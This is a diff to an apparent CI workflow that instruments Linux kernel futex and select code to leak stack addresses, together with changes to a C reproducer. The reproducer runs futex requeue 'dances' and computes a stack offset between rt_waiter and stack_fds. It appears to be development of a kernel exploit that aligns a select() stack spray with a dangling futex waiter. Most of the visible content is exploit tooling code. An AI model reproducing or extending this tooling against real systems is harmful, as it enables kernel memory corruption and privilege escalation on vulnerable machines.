@@ -84,13 +84,15 @@ jobs:
               print('futex.c rt_waiter print WARN: needle missing')
           open('linux-g/kernel/futex.c','w').write(f)
 
-          # 3) stack_fds print in fs/select.c core_sys_select
+          # 3) stack_fds print in fs/select.c core_sys_select（稳定 needle：do_select 调用前）
           g = open('linux-g/fs/select.c').read()
           done = False
-          decl = 'long stack_fds[SELECT_STACK_ALLOC/sizeof(long)];'
-          if decl in g:
-              g = g.replace(decl, decl + '\n\tpr_info("DBG stack_fds=%px\\n", stack_fds);', 1)
-              done = True
+          for needle in ('ret = do_select(n, &fds, end_time);',
+                         'ret = do_select(n, &fds, &end_time);'):
+              if needle in g:
+                  g = g.replace(needle, 'pr_info("DBG stack_fds=%px\\n", stack_fds);\n\t' + needle, 1)
+                  done = True
+                  break
           print('select.c stack_fds print:', 'OK' if done else 'WARN')
 
           # 4) proxy lock + requeue markers (keep v9 instrumentation)
@@ -277,6 +279,21 @@ jobs:
             return NULL;
           }
 
+          static long run_measure(int idx) {
+            /* 纯测距：无 owner/consumer/requeue —— 只触发 rt_waiter/stack_fds 打印 */
+            word_shift = 0;
+            dance_idx = idx;
+            owner_has_target = 1;   /* 模拟 owner，让 waiter 走完流程 */
+            waiter_has_chain = waiter_waiting = 0;
+            route_done = 0;
+            owner_chain_done = 1;
+            ghost_go = consumer_done = 0;
+            pthread_t w;
+            pthread_create(&w, NULL, waiter_fn, NULL);
+            while (!route_done) usleep(10000);
+            return 0;
+          }
+
           static long run_dance(int idx, int shift) {
             word_shift = shift;
             dance_idx = idx;
@@ -333,8 +350,8 @@ jobs:
                    before[0],before[1],before[2],before[3],before[4],before[5],before[6],before[7],
                    before[8],before[9],before[10],before[11],before[12],before[13],before[14],before[15]);
 
-            printf("REPRO dance1 shift=0\n");
-            run_dance(0, 0);
+            printf("REPRO measure\n");
+            run_measure(0);
 
             unsigned long qwaiter = 0, sfds = 0;
             find_delta(&qwaiter, &sfds);
@@ -346,7 +363,10 @@ jobs:
                 shift = (int)(d / 8);
             }
             printf("REPRO computed shift=%d\n", shift);
-            if (shift < 0) shift = 0;
+            if (shift < 0) {
+              printf("REPRO delta NEGATIVE/out-of-range, abort before crash\n");
+              return 0;
+            }
 
             printf("REPRO dance2 shift=%d\n", shift);
             run_dance(1, shift);
